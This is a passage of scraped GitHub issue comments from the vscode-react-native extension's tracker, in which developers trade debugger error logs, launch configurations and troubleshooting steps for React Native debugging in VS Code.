14:24:25.828  5163  5196 D ReactNative: ReactInstanceManager.setupReactContext()\n04-17 14:24:25.828  5163  5196 D ReactNative: CatalystInstanceImpl.initialize()\n04-17 14:24:25.829  5163  5196 D ReactNative: ReactInstanceManager.attachRootViewToInstance()`\nDebug Console info\nOS: win32 x64\nAdapter node: v8.9.3 x64\nvscode-chrome-debug-core: 3.23.0\nStarting debugger app worker.\nEstablished a connection with the Proxy (Packager) to the React Native application\nDebugger worker loaded runtime on port 22162\nError: EBADF: bad file descriptor, uv_pipe_open\nchild_process.js:108\n    at Object.exports._forkChild (child_process.js:108:5)\n    at Object.setupChannel (internal/process.js:222:30)\n    at startup (internal/bootstrap/node.js:68:14)\n    at bootstrapNodeJSCore (internal/bootstrap/node.js:516:3). @annakocheshkova I have installed the stable version of VSCode 1.22.2, the issue also exist...\nMy operation as below:\n\ninstall the stable version of VSCode.\ninstall the React-Native tools extension\nyarn global add react-native-cli\nreact-native init awsomeProject\ncd the project folder\nreact-native run-android   -----------this command executed sucessfully\nadd react-native debug config file as default,\nswitch to the 'Debug Android', and the debug.\nthe issue still exist...\n\nDebug Console output infor\nOS: win32 x64\nAdapter node: v7.9.0 x64\nvscode-chrome-debug-core: 3.23.0\nStarting debugger app worker.\nEstablished a connection with the Proxy (Packager) to the React Native application\nDebugger worker loaded runtime on port 30676\nError: EBADF: bad file descriptor, uv_pipe_open\nchild_process.js:108\n    at Object.exports._forkChild (child_process.js:108:5)\n    at Object.setupChannel (internal/process.js:222:30)\n    at startup (internal/bootstrap/node.js:68:14)\n    at bootstrapNodeJSCore (internal/bootstrap/node.js:516:3)\nawsomeProject.zip. ",
    "BarlowTucker": "Same result if you have \n\"react-redux\": \"^5.0.7\",\n\"redux\": \"^3.7.2\",\n\"redux-thunk\": \"^2.2.0\". ",
    "Yousefjb": "I have package.json as\n{\n  \"name\": \"app\",\n  \"version\": \"0.0.1\",\n  \"private\": true,\n  \"scripts\": {\n    \"start\": \"node node_modules/react-native/local-cli/cli.js start\"\n  },\n  \"dependencies\": {\n    \"react\": \"16.3.1\",\n    \"react-native\": \"0.55.2\"\n  }\n}\nAnd debug config does not show. ",
    "jsslai": "https://github.com/Microsoft/vscode-react-native/pull/686 :). ",
    "YaAlfred": "Great, 0.6.8 works well, thanks a lot. ",
    "lardissone": "Same thing is happening to me. Also there's no way to see the log point message on the break.. ",
    "maxmamis": "@ruslan-bikkinin thanks, didn't realize that was the same issue . ",
    "MrLoh": "I don't have a settings.json, just a launch.json and I get the error even in a fresh react-native inited project. . I disabled all but the react native extension, my Debug Console is absolutely empty, even if I add verbose tracing option, I'm pretty sure the process just doesn't get started, because of the error that is reported in the Developer Tools console. This is a fresh empty react-native inited project. \nHere is my completely fresh auto generated launch.json: \njson\n{\n  \"version\": \"0.2.0\",\n  \"configurations\": [\n    {\n      \"name\": \"Debug Android\",\n      \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n      \"type\": \"reactnative\",\n      \"request\": \"launch\",\n      \"platform\": \"android\",\n      \"sourceMaps\": true,\n      \"outDir\": \"${workspaceRoot}/.vscode/.react\",\n      \"trace\": \"verbose\"\n    },\n    {\n      \"name\": \"Debug iOS\",\n      \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n      \"type\": \"reactnative\",\n      \"request\": \"launch\",\n      \"platform\": \"ios\",\n      \"sourceMaps\": true,\n      \"outDir\": \"${workspaceRoot}/.vscode/.react\",\n      \"trace\": \"verbose\"\n    },\n    {\n      \"name\": \"Attach to packager\",\n      \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n      \"type\": \"reactnative\",\n      \"request\": \"attach\",\n      \"sourceMaps\": true,\n      \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n    },\n    {\n      \"name\": \"Debug in Exponent\",\n      \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n      \"type\": \"reactnative\",\n      \"request\": \"launch\",\n      \"platform\": \"exponent\",\n      \"sourceMaps\": true,\n      \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n    }\n  ]\n}. Yes I did that, it lead to the following additional output in  the Developer Tools console\n\n. I\u2019m not using nvm and I am able to run all React native commands for building the app from within the vscode terminal. I\u2019m using yarn and the fish shell though, could that have anything todo with it? React native cli is accessible from bash as well though. \nSent with GitHawk. which react-native: /Users/tolo/.npm-packages/bin/react-native\nAs I already stated react-native works fine otherwise when I use it from the vscode terminal. \nHow do I check my user permissions/access rights for VS Code? . Oh, you just ment the permission to he .app executable, gotcha, they are: \ndrwxr-xr-x@   4 tolo  staff      128 May 15 16:09 Visual Studio Code.app. No, it still fails with the same error, after reinstalling, is there any way I can edit the extension to produce some more error output. The main issue seems to be that the extension fails to start but doesn't log any specific errors either. . Ok thanks for your effort. I\u2019ll see when I find time to look into setting up debugging the extension. I\u2019m traveling at the moment. . None of that helps either, all of that was configured correctly and removing ./node_modules/.bin from path doesn't make a difference. \nI'm gonna give up on getting this plugin to work and revisit it on my next computer with a fresh system. Since there is no meaningfull error message there is no reasonable path to solving this issue at the time and we are probably just wasting my and your time. Thank you a lot for all the great effort to come up with ideas what this could be related to though. \nI'm closing for now. If there is a clear way how to pinpoint the actual cause of this issue in the future, via better error reporting, let me know. . @ruslan-bikkinin I just setup the debugger for a node project and the project also couldn't find my globally installed nodemon runtime executable. I could fix it by pointing to ${workspaceFolder}/node_modules/.bin/nodemon but maybe the react-native plugin has a similar issue, not being able to find the global react-native-cli installation as you had mentioned before. \nI run fish as my shell, but which react-native works in fish, bash, and sh, so I'm not sure it could have anything to do with that. But it seems that the vscode execution somehow runs commands differently and maybe doesn't find the executable in PATH. How does vscode execute the commands, do you have any more ideas, what could be going on? . @iTOYS no the .bash_profile is set up correctly. How exactly are the react-native commands from this extension executed. Can I somehomw reproduce how they are executed on my computer. Is it a shell script file with #!/bin/bash in the file, or is it called from node? . ",
    "rpedroni": "For future reference, I was having the same problem.\nRemoving the package, closing VSCode and reinstalling fixed it.. ",
    "diehardest": "That was an issue with node packages, I manage to fix it after reinstalling node packages and run-react native upgrade. ",
    "ldhios": "Hi @ruslan-bikkinin \n2,  Maybe you not understand. My package is not started. Auto run package start, when i click attach to packager.  That is my mean.\nSorry for my bad english, I will improve it.. @ruslan-bikkinin \nHi, thanks for your reply. vscode debug is good than webstorm debug,through my use few days. The stability vscode also better webstorm.  That's perfect, if your fix the #625.  I will absolute deprecated chrome debug.\nThans!\n. ",
    "jdnichollsc": "ohh works perfect, thanks!!. ",
    "jackjj12": "Hi @ruslan-bikkinin  I have read your message about the software version. In fact my expo and xde is okay. I have used xde to start my app and use'exp start', all these methods is okay. I could run my app with these methods. but I still have the problem above. My XDE version is newest. I can not debug with vs code. And I have to debug with chrome browser.. Okay, I have noticed that the error happend on both expo and vscode. its my mistake maybe. It maybe a problem for expo. \nBut when the problem happened in expo . I can still view my app with my expo tools.\nBut in vs code ,just can not debug. maybe you can download a expo or crna and set up enviroment to test it.\nbelow is the out put from vscode \nsame problem come with expo. \n[Warning] Warning: 'antd-mobile' dependency is not installed.\nWarning: 'babel-plugin-module-resolver' dependency is not installed.\nWarning: 'expo' dependency is not installed.\nWarning: 'react' dependency is not installed.\nWarning: 'react-native' dependency is not installed.\nWarning: 'react-native-charts-wrapper' dependency is not installed.\nWarning: 'react-native-elements' dependency is not installed.\nWarning: 'react-native-i18n' dependency is not installed.\nWarning: 'react-navigation' dependency is not installed.\nIf there is an issue running your project, please run npm install in e:\\Demo\\demo-detach\\react-native-simple-demo and restart.\nNo issue with project-adb-reverseNo issue with project-adb-reverseLoading dependency graph, done.\n[Error] Error starting tunnel: Error: Starting tunnels timed out\n[Error] Error starting tunnel: Error: Starting tunnels timed out\n[Error] Error: Starting tunnels timed out\nError starting tunnel: Error: Starting tunnels timed out. If you can share me a configuration with expo or a example project with environment that can run well for us maybe in github or others. it is better.. Really Sorry to response to you so late. it works. but there are another problem of can not debug serveral page. and generate a bug of \"process.send\". maybe something of the new version rn.\nplease note it . and I will colse this issue.. ",
    "LingYun": "Hi @ruslan-bikkinin I try you say methods run project in XCode set debug again and via react-native run-ios.But vscode do not debug. I screenshot A few picture send you.\n\n\n\n\n. @ruslan-bikkinin I'm sorry.The reply is late you.  This question is because of the mac system.\nEverything is normal after I reinstall the system.\nThanks for your help.. ",
    "DreamwareDevelopment": "This isn't solved. I'm not going to reinstall my OS just to get this working.. ",
    "jascodes": "Well I can but this is feature request and not bug report; adb reverse tcp:8081 tcp:8081 is not designed to reverse tunnel over wifi, but vscode rn-extension is designed to connect debugger via hardcoded localhost port which is tunneled with adb reverse. I you can introduce option to use add android ip to directly connect with android port somehow, over the air adb rn-debugging might work.\nStill let me know if you wanna post all the info.\nThx. @ruslan-bikkinin Thx for getting back to me, lil hectic schedule for me over week or two but will try out at point of time; excuse me for time gap :).\nBut as I remember I did tried exactly all these steps and didn't worked out for me at that time. But I will gladly retry it and post my feedback. \nThx. There might be also regression, in latest release, debugger started complaining of root project, \n\"react-native-tools.projectRoot\": \"./packages/client\"\nOS: darwin x64\nAdapter node: v7.9.0 x64\nvscode-chrome-debug-core: 3.17.3\nCould not debug. Seems to be that you are trying to debug from within directory that is not a React Native project root.\nIf so, please, follow these instructions: https://github.com/Microsoft/vscode-react-native/blob/master/doc/customization.md#project-structure.. @rakeshgits yes \n1. download vsix\nhttps://vsmobile.gallery.vsassets.io/_apis/public/gallery/publisher/vsmobile/extension/vscode-react-native/0.6.10/assetbyname/Microsoft.VisualStudio.Services.VSIXPackage\n2. uninstall extension from vscode\n3. update user settings to disable auto extension install \"extensions.autoUpdate\": false\n4. use command pallet in vscode to install vsixpackage, remember to rename extension from .VSIXPackage to .vsix\nIts pain in the ass,\nso upvote my suggestion at\nhttps://github.com/Microsoft/vscode/issues/51675\nThx. Yes, using lerna, at the moment using 0.6.9.\nI double chk this and post here later.. I figured it out, my settings.json file was ending with trailing comma and I guess maybe not parsed and hence giving the error since property didn't set. But I guess there should some notification of this error in json or something.. That will be indeed helpful.\nThx. Lemme put out all outputs \nReact Native\n```\n[Info] Stopping Packager\n[Info] Packager stopped\n[Info] Starting Packager\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                                                                              \u2502\n\u2502  Running Metro Bundler on port 8081.                                         \u2502\n\u2502                                                                              \u2502\n\u2502  Keep Metro running while developing on any JS projects. Feel free to        \u2502\n\u2502  close this tab and run your own Metro instance if you prefer.               \u2502\n\u2502                                                                              \u2502\n\u2502  https://github.com/facebook/react-native                                    \u2502\n\u2502                                                                              \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\nLooking for JS files in\n   d:\\play\\rntest1 \n[Info] Packager started.\n[Info] Prewarming bundle cache. This may take a while ...\n[Info] About to get: http://localhost:8081/index.bundle?platform=android\nLoading dependency graph, done.\n[Info] Building and running application.\n::ffff:127.0.0.1 - - [15/Oct/2018:10:05:48 +0000] \"GET /index.bundle?platform=android HTTP/1.1\" 500 - \"-\" \"-\"\nerror: bundling failed: ReferenceError: SHA-1 for file d:\\play\\rntest1\\index.js is not computed\n    at DependencyGraph.getSha1 (d:\\play\\rntest1\\node_modules\\metro\\src\\node-haste\\DependencyGraph.js:200:13)\n    at d:\\play\\rntest1\\node_modules\\metro\\src\\DeltaBundler\\Transformer.js:164:26\n    at Generator.next ()\n    at step (d:\\play\\rntest1\\node_modules\\metro\\src\\DeltaBundler\\Transformer.js:31:30)\n    at d:\\play\\rntest1\\node_modules\\metro\\src\\DeltaBundler\\Transformer.js:50:14\n    at new Promise ()\n    at d:\\play\\rntest1\\node_modules\\metro\\src\\DeltaBundler\\Transformer.js:28:12\n    at Transformer.transformFile (d:\\play\\rntest1\\node_modules\\metro\\src\\DeltaBundler\\Transformer.js:188:7)\n    at d:\\play\\rntest1\\node_modules\\metro\\src\\Bundler.js:78:34\n    at Generator.next ()\nStarting custom debugger by executing: echo A debugger is not needed:  \"d:\\play\\rntest1\"\n::ffff:127.0.0.1 - - [15/Oct/2018:10:06:01 +0000] \"GET /launch-js-devtools HTTP/1.1\" 200 - \"-\" \"okhttp/3.10.0\"\n[Info] Enable JS Debugging\nStarting custom debugger by executing: echo A debugger is not needed:  \"d:\\play\\rntest1\"\n::ffff:127.0.0.1 - - [15/Oct/2018:10:06:03 +0000] \"GET /launch-js-devtools HTTP/1.1\" 200 - \"-\" \"okhttp/3.10.0\"\nStarting custom debugger by executing: echo A debugger is not needed:  \"d:\\play\\rntest1\"\n::ffff:127.0.0.1 - - [15/Oct/2018:10:06:03 +0000] \"GET /launch-js-devtools HTTP/1.1\" 200 - \"-\" \"okhttp/3.10.0\"\nStarting custom debugger by executing: echo A debugger is not needed:  \"d:\\play\\rntest1\"\n::ffff:127.0.0.1 - - [15/Oct/2018:10:06:06 +0000] \"GET /launch-js-devtools HTTP/1.1\" 200 - \"-\" \"okhttp/3.10.0\"\nReact Native: Run Android\n[Warning] Target simulator is not supported for Android platform. If you want to use particular device or simulator for launching Android app, please specify  device id (as in 'adb devices' output) instead.\n[Info] Using Android SDK location defined in android/local.properties file: C:\\Users\\jas\\AppData\\Local\\Android\\Sdk.\n[Info] Starting React Native Packager.\nBuilding and installing the app on the device (cd android && gradlew.bat installDebug)...\nNDK is missing a \"platforms\" directory.\nIf you are using NDK, verify the ndk.dir is set to a valid NDK directory.  It is currently set to C:\\Users\\jas\\AppData\\Local\\Android\\Sdk\\ndk-bundle.\nIf you are not using NDK, unset the NDK variable from ANDROID_NDK_HOME or local.properties to remove this warning.\n:app:preBuild UP-TO-DATE\n:app:preDebugBuild UP-TO-DATE\n:app:compileDebugAidl UP-TO-DATE\n:app:compileDebugRenderscript UP-TO-DATE\n:app:checkDebugManifest UP-TO-DATE\n:app:generateDebugBuildConfig UP-TO-DATE\n:app:prepareLintJar UP-TO-DATE\n:app:mainApkListPersistenceDebug UP-TO-DATE\n:app:bundleDebugJsAndAssets SKIPPED\n:app:generateDebugResValues UP-TO-DATE\n:app:generateDebugResources UP-TO-DATE\n:app:mergeDebugResources UP-TO-DATE\n:app:createDebugCompatibleScreenManifests UP-TO-DATE\n:app:processDebugManifest UP-TO-DATE\n:app:splitsDiscoveryTaskDebug UP-TO-DATE\n:app:processDebugResources UP-TO-DATE\n:app:generateDebugSources UP-TO-DATE\n:app:javaPreCompileDebug UP-TO-DATE\n:app:compileDebugJavaWithJavac UP-TO-DATE\n:app:compileDebugNdk NO-SOURCE\n:app:compileDebugSources UP-TO-DATE\n:app:mergeDebugShaders UP-TO-DATE\n:app:compileDebugShaders UP-TO-DATE\n:app:generateDebugAssets UP-TO-DATE\n:app:mergeDebugAssets UP-TO-DATE\n:app:copyDebugBundledJs SKIPPED\n:app:transformClassesWithDexBuilderForDebug UP-TO-DATE\n:app:transformDexArchiveWithExternalLibsDexMergerForDebug UP-TO-DATE\n:app:transformDexArchiveWithDexMergerForDebug UP-TO-DATE\n:app:mergeDebugJniLibFolders UP-TO-DATE\n:app:transformNativeLibsWithMergeJniLibsForDebug UP-TO-DATE\n:app:processDebugJavaRes NO-SOURCE\n:app:transformResourcesWithMergeJavaResForDebug UP-TO-DATE\n:app:validateSigningDebug UP-TO-DATE\n:app:packageDebug UP-TO-DATE\n:app:assembleDebug UP-TO-DATE\n:app:installDebug\nInstalling APK 'app-debug.apk' on 'Nexus_5X_API_28_x86(AVD) - 9' for app:debug\nInstalled on 1 device.\nBUILD SUCCESSFUL in 3s\n27 actionable tasks: 1 executed, 26 up-to-date\nRunning adb -s emulator-5554 reverse tcp:8081 tcp:8081\nStarting the app on emulator-5554 (adb -s emulator-5554 shell am start -n com.rntest1/com.rntest1.MainActivity)...\nStarting: Intent { cmp=com.rntest1/.MainActivity }\nLogcat emulator 554\n[Info] 10-15 15:35:48.002  8237  8237 D ReactNative: ReactInstanceManager.detachViewFromInstance()\n[Info] LogCat monitoring stopped because the process exited.\n[Info] 10-15 15:36:04.844  8400  8400 D ReactNative: ReactInstanceManager.ctor()\n[Info] 10-15 15:36:05.033  8400  8400 D ReactNative: ReactInstanceManager.createReactContextInBackground()\n10-15 15:36:05.033  8400  8400 D ReactNative: ReactInstanceManager.recreateReactContextInBackgroundInner()\n[Info] 10-15 15:36:05.877  8400  8400 D ReactNative: ReactInstanceManager.onReloadWithJSDebugger()\n[Info] 10-15 15:36:05.882  8400  8400 D ReactNative: ReactInstanceManager.recreateReactContextInBackground()\n10-15 15:36:05.882  8400  8400 D ReactNative: ReactInstanceManager.runCreateReactContextOnNewThread()\n[Info] 10-15 15:36:06.132  8400  8432 D ReactNative: ReactInstanceManager.createReactContext()\n[Info] 10-15 15:36:06.690  8400  8432 D ReactNative: Initializing React Xplat Bridge.\n[Info] 10-15 15:36:06.697  8400  8432 D ReactNative: Initializing React Xplat Bridge before initializeBridge\n[Info] 10-15 15:36:06.704  8400  8432 D ReactNative: Initializing React Xplat Bridge after initializeBridge\n[Info] 10-15 15:36:06.704  8400  8432 D ReactNative: CatalystInstanceImpl.runJSBundle()\n[Info] 10-15 15:36:06.720  8400  8438 D ReactNative: ReactInstanceManager.setupReactContext()\n10-15 15:36:06.720  8400  8438 D ReactNative: CatalystInstanceImpl.initialize()\n10-15 15:36:06.725  8400  8438 D ReactNative: ReactInstanceManager.attachRootViewToInstance()\n```\nvscode debug console\nOS: win32 x64\nAdapter node: v8.9.3 x64\nvscode-chrome-debug-core: 3.17.3\nStarting debugger app worker.\nEstablished a connection with the Proxy (Packager) to the React Native application\nDebugger worker loaded runtime on port 9842\n******** Unhandled error in debug adapter: SyntaxError: Unexpected token L in JSON at position 0\n    at JSON.parse (<anonymous>)\n    at Pipe.channel.onread (internal/child_process.js:470:28)\nWindows work environment was sort of temporary and I will be moving back to linux at some point; will let u know if its realated to my setup.\nIs the extensions works for you and whats your env?\nPS: lemme know if you need more info.\nThx. Bingo; node lts fixed packager issue; but now debugger won't attach. Let me drill in little bit and will post right back.\nThx. ",
    "LorienOlive": "\n@ruslan-bikkinin it is haul library, thanks, it started working after removing that.\nThanks a lot for all the help.\n\nI'm having the same issue, but I'm not using the Haul library.  Are there others that are known to also cause this issue?\n. ",
    "christianmtr": "Hello!\nYes. adb command works in both terminals.\n\nCould you please clarify which terminal you mentioned: system terminal or VS Code terminal? Please make sure that adb works in both terminals.\n\nThis is the output of echo $PATH:\n$ echo $PATH\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/my/path/Android/Sdk/tools:/my/path/Android/Sdk/platform-tools\nThanks!. I did run VS Code from the terminal and all works fine. By this way I can run \"React native: Run Android on device/emulator\" or \"Debug Android\" and it works.. In .bashrc. It's working now!\nI rename the .bashrc to .bash_profile and alias commands that I had does not working.\nI added the alias commands to .bashrc and works fine. Now I have the both files ( .bashrc and .bash_profile).\nThanks :+1: . ",
    "RMacfarlane": "@echeypaz Please provide more details about how to reproduce this problem. What did you run to see this error? What version of VSCode are you using and what is your OS?. From @echeypaz on June 12, 2018 7:1\nHi @RMacfarlane, Thanks,\nVSCode Version 1.24.0\nNodo 7.9.0\nArquitectura x64.\nWindows 10.\nI was debugg a react-native app (with react-native tools)\n. Thank you for the details! I'm still not sure how to reproduce this. Can you please describe exactly what you did to see this, or share your code? Is this an issue with VSCode itself, or is this specific to the react-native extension? This does not sound like a feature of VSCode itself and might be better moved to https://github.com/Microsoft/vscode-react-native. From @echeypaz on June 13, 2018 6:45\nI completely agree. The problem arises when debugging with react-native-tools, because when I use the chrome debugger, after launching react-native run-android, this problem does not play. Could you move the post to the right place?. ",
    "echeypaz": "Hi, sorry, but I've been busy.\nI am begining with shoutem project cloned from the builder.\nBest Regards,\n2018-06-19 16:55 GMT+01:00 Artem Egorov notifications@github.com:\n\n@echeypaz https://github.com/echeypaz\nJust a friendly ping.\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub\nhttps://github.com/Microsoft/vscode-react-native/issues/727#issuecomment-398450996,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/ABrIeQ0OhEoerzOEDU9wTdF0Ww8gKhNCks5t-R8JgaJpZM4UmkOF\n.\n. Yes, there are shoutem CLI, you can create shoutem builder account and then\n\"shoutem login\", \"shoutem clone\" ...\n\n2018-06-19 19:41 GMT+01:00 Artem Egorov notifications@github.com:\n\n@echeypaz https://github.com/echeypaz\nHow I can clone app from shoutem builder?\nBTW, is it work from command line?\nreact-native run-android\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub\nhttps://github.com/Microsoft/vscode-react-native/issues/727#issuecomment-398503260,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/ABrIecx44x4G5Z-5E9VLB1ZDmkxORc-nks5t-UXbgaJpZM4UmkOF\n.\n. \n",
    "VanessaChu": "This is my launch configuration:\n{\n    \"name\": \"Debug iOS\",\n    \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n    \"type\": \"reactnative\",\n    \"request\": \"launch\",\n    \"platform\": \"ios\",\n    \"sourceMaps\": true,\n    \"target\": \"iPhone 6 Plus\",\n    \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n  }. Same issue on both simulator and real device.\nLaunch configuration for real device:\n{\n    \"name\": \"Debug iOS Device\",\n    \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n    \"type\": \"reactnative\",\n    \"request\": \"launch\",\n    \"platform\": \"ios\",\n    \"target\": \"device\",\n    \"sourceMaps\": true,\n    \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n}. ",
    "gagaJay": "I got the same issue here, have updated to the latest vsCode 1.24.1 and still with no luck. It can run \"Debug iOS\" and start the app but when I select Debug Remote JS, it always opens the chrome dev tool and never stops at the break point on vsCode. Please check my config detail. \n        {\n            \"name\": \"Debug iOS\",\n            \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n            \"type\": \"reactnative\",\n            \"request\": \"launch\",\n            \"platform\": \"ios\",\n            \"sourceMaps\": true,\n            \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n        },\n. I see why now. \"Debug iOS\" simply does not work when you create project with create-react-native-app cause it will run app on the expo client which will listen to different port other than 8081. you have to eject your project to make it run solely on the simulator so that it will listen to the same port as VSCode. \nDoes anyone knows a way to change the listening port on \"Debug iOS\"?. ",
    "delciopolanco": "Hi guys, the same happening to me using vscode 1.24.1. \n\nangular 6.0.4\nangular cli 6.0.8\nnode 8.11.2\n\n\n. My Bad!!!. ",
    "bogdant": "Experiencing the same issue. ",
    "hugey010": "I'm having this same issue and I'm not sure why this got closed. Running react-native run-android and then attaching the vscode debugger works fine. It is a valid workaround but quite annoying.. ",
    "2hyjun": "@iTOYS  @ruslan-bikkinin \nWhen I init a new RN Project via react-native init (latest version) and debug ios via React Native Tools,\nbreak points works well. I don't know why...\nOn new project, a TSServer is running.\n\nHere are my extensions.\n\n\n. Hi @iTOYS, thanks for your help.\nI tried to debug with Chrome, it worked well with breakpoints.\nBut on vscode, it still doesn't work.\n\n. Hi @ruslan-bikkinin,\nI really thanks for you guys help.\nI disabled all of my extensions except React Native Tools, and tried to debug again, but break points doesn't works.\nMaybe these are all you need.\n2. Package.json\n\"dependencies\": {\n        \"lodash\": \"^4.17.5\",\n        \"moment\": \"^2.22.2\",\n        \"prop-types\": \"^15.6.1\",\n        \"react\": \"^16.3.0-alpha.1\",\n        \"react-native\": \"0.54.3\",\n        \"react-native-android-wifi\": \"^0.0.30\",\n        \"react-native-app-intro-slider\": \"^0.2.4\",\n        \"react-native-collapsible\": \"^0.12.0\",\n        \"react-native-communications\": \"^2.2.1\",\n        \"react-native-device-info\": \"^0.21.5\",\n        \"react-native-elements\": \"^0.19.1\",\n        \"react-native-event-listeners\": \"^1.0.3\",\n        \"react-native-extra-dimensions-android\": \"^0.21.0\",\n        \"react-native-firebase\": \"^4.2.0\",\n        \"react-native-immediate-phone-call\": \"^1.0.0\",\n        \"react-native-iphone-x-helper\": \"^1.0.3\",\n        \"react-native-keyboard-spacer\": \"^0.4.1\",\n        \"react-native-linear-gradient\": \"^2.4.0\",\n        \"react-native-modal-datetime-picker\": \"^6.0.0\",\n        \"react-native-network-info\": \"^3.2.2\",\n        \"react-native-paho-mqtt\": \"^0.1.1\",\n        \"react-native-phone-input\": \"^0.2.1\",\n        \"react-native-slider\": \"^0.11.0\",\n        \"react-native-sound\": \"^0.10.9\",\n        \"react-native-splash-screen\": \"^3.0.9\",\n        \"react-native-swiper\": \"^1.5.13\",\n        \"react-native-system-setting\": \"^1.4.4\",\n        \"react-native-tab-view\": \"^0.0.77\",\n        \"react-native-text-input-mask\": \"^0.7.0\",\n        \"react-native-vector-icons\": \"^4.5.0\",\n        \"react-native-version-number\": \"^0.3.4\",\n        \"react-navigation\": \"^1.5.9\",\n        \"react-redux\": \"^5.0.7\",\n        \"redux\": \"^3.7.2\",\n        \"redux-devtools-extension\": \"^2.13.2\"\n    },\n    \"devDependencies\": {\n        \"babel-eslint\": \"^8.2.2\",\n        \"babel-jest\": \"22.4.3\",\n        \"babel-preset-react-native\": \"4.0.0\",\n        \"eslint\": \"^4.19.1\",\n        \"eslint-config-airbnb-base\": \"^12.1.0\",\n        \"eslint-plugin-import\": \"^2.10.0\",\n        \"eslint-plugin-react\": \"^7.7.0\",\n        \"eslint-plugin-react-native\": \"^3.2.1\",\n        \"jest\": \"22.4.3\",\n        \"react-test-renderer\": \"^16.3.0-alpha.1\"\n    },\n4 - 1 Output of the Debug Console (View -> Toggle Debug Console):\nOS: darwin x64\nAdapter node: v7.9.0 x64\nvscode-chrome-debug-core: 3.17.3\n09:39:54, 2018-7-12\nFrom client: initialize({\"clientID\":\"vscode\",\"clientName\":\"Visual Studio Code\",\"adapterID\":\"reactnative\",\"pathFormat\":\"path\",\"linesStartAt1\":true,\"columnsStartAt1\":true,\"supportsVariableType\":true,\"supportsVariablePaging\":true,\"supportsRunInTerminalRequest\":true,\"locale\":\"en\"})\nTo client: {\"seq\":0,\"type\":\"response\",\"request_seq\":1,\"command\":\"initialize\",\"success\":true,\"body\":{\"exceptionBreakpointFilters\":[{\"label\":\"All Exceptions\",\"filter\":\"all\",\"default\":false},{\"label\":\"Uncaught Exceptions\",\"filter\":\"uncaught\",\"default\":false}],\"supportsConfigurationDoneRequest\":true,\"supportsSetVariable\":true,\"supportsConditionalBreakpoints\":true,\"supportsCompletionsRequest\":true,\"supportsHitConditionalBreakpoints\":true,\"supportsRestartFrame\":true,\"supportsExceptionInfoRequest\":true,\"supportsDelayedStackTraceLoading\":true,\"supportsValueFormattingOptions\":true,\"supportsEvaluateForHovers\":true,\"supportsLogPoints\":true}}\nStarting debugger app worker.\nAbout to download: http://localhost:8081/debugger-ui/debuggerWorker.js to: /Users/2hyjun/schaffengott/IGDEFLAM/client/.vscode/.react/debuggerWorker.js\nEstablished a connection with the Proxy (Packager) to the React Native application\nFrom RN APP: {\"id\":10000,\"method\":\"prepareJSRuntime\"}\nA new app worker lifetime was created.\nSpawned debuggee process with pid 6966 listening to 30696\nDebugger worker loaded runtime on port 30696\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"output\",\"body\":{\"category\":\"telemetry\",\"output\":\"debugStarted\",\"data\":{\"request\":\"attach\",\"args\":[\"name\",\"program\",\"type\",\"request\",\"platform\",\"sourceMaps\",\"outDir\",\"trace\",\"__sessionId\",\"port\",\"address\",\"restart\",\"remoteRoot\",\"localRoot\",\"sourceMapPathOverrides\",\"showAsyncStacks\"]}}}\nTo RN APP: {\"replyID\":10000}\n...\n4 - 2 Output of the React-Native output channel\n```\n[Info] Starting Packager\nScanning folders for symlinks in /Users/2hyjun/schaffengott/IGDEFLAM/client/node_modules (23ms)\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                                                                              \u2502\n\u2502  Running Metro Bundler on port 8081.                                         \u2502\n\u2502                                                                              \u2502\n\u2502  Keep Metro running while developing on any JS projects. Feel free to        \u2502\n\u2502  close this tab and run your own Metro instance if you prefer.               \u2502\n\u2502                                                                              